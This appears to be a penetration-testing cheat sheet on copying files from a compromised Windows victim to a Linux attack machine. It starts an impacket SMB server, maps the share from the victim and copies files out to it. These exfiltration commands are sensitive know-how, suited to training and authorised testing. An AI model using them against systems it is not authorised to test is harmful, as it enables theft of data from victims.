
## Windows to Linux Transfer Methods

- The below methods can be used to transfer file from Linux machine to Windows Machine.
- Linux machine is our Attack Machine.
- Windows machine is our Victim Machine.


## SMB Share Method


### Start SMB server (ATTACK MACHINE)

- We need to specify the directory path we want to share.
- We setup a SMB server in our Attack Machine 

```bash
sudo impacket-smbserver share -smb2support <directory path to share>
```

### Authenticate to the SMB server (VICTIM MACHINE)

- Now that the SMB server has been started we need to provided the credentials of the Attack Machine (`username` and `password`) to authenticate the Victim Machine to the SMB server.
- So provide **username**, **password**, **IP address** of the Attack Machine.
- You will be prompted to enter password later.

```bash
net use n: \\<Attack Machine IP>\share /user:<username>
```

### Upload File to SMB server (VICTIM MACHINE)

- The below command copies a file from Victim Machine to Attack Machine. We transfer file from Windows to Linux.

```bash
copy <file to copy from Victim to Attack Machine> \\<Attack Machine IP>\share\
```

